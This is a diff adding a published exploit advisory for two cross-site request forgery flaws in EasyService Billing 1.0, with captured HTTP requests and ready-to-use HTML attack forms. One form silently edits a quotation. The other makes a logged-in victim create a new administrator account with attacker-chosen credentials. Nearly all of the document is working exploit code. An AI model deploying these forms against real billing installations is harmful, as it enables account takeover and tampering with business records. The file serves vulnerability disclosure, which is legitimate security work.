@@ -1,0 +1,87 @@
+<!--
+# Exploit Title: EasyService Billing 1.0 Multiple Cross-Site Request Forgery
+# Date: 25-05-2018
+# Software Link: https://codecanyon.net/item/easyservice-billing-php-scripts-for-quotation-invoice-payments-etc/16687594 
+# Exploit Author: Divya Jain
+# Version: EasyService Billing 1.0 
+# CVE: CVE-2018-11445,CVE-2018-11442
+# Category: Webapps
+# Severity: Medium
+# Tested on: KaLi LinuX_x64
+# # # # # # # #
+#
+# Proof of Concept:
+           //////////////////////////
+          / CSRF in Quotation Page /
+         //////////////////////////
+# Initial Request:
+
+POST /EasyServiceBilling/quotation-new3-new2.php?add=true&id=139 HTTP/1.1
+Host: test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://test.com/EasyServiceBilling/quotation-new3-new2.php?add=true&id=139
+Cookie: tntcon=5078855aa89b90f68de5644f75495364a4xn; PHPSESSID=58bf7e8rf0jpiepg3iu7larrj2
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+
+quotation_id=139&quotation_no=249&des=test&button=Save&MM_update=form1&MM_insert=form1
+
+# CSRF POC:
+
+<html>
+ <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://test.com/EasyServiceBilling/quotation-new3-new2.php?add=true&id=139" method="POST">
+      <input type="hidden" name="quotation&#95;id" value="139" />
+      <input type="hidden" name="quotation&#95;no" value="249" />
+      <input type="hidden" name="des" value="testnew" />
+      <input type="hidden" name="button" value="Save" />
+      <input type="hidden" name="MM&#95;update" value="form1" />
+      <input type="hidden" name="MM&#95;insert" value="form1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+           ///////////////////////////
+          // CSRF in User Add Page //
+         ///////////////////////////
+         
+# Initial Request
+
+POST /EasyServiceBilling/system-settings-user-new2.php? HTTP/1.1
+Host: test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://test.com/EasyServiceBilling/system-settings-user-new2.php
+Cookie: tntcon=ea1c7cc27fc02e6abf755d54fa60a8a8a4xn; PHPSESSID=kao38vbne4c4s9s0587o8h99e6
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+type=Admin&un=a&pw=b&MM_insert=form1
+         
+# CSRF POC
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://test.com/EasyServiceBilling/system-settings-user-new2.php?" method="POST">
+      <input type="hidden" name="type" value="Admin" />
+      <input type="hidden" name="un" value="adminTest" />
+      <input type="hidden" name="pw" value="adminTest" />
+      <input type="hidden" name="MM&#95;insert" value="form1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+         
+-->
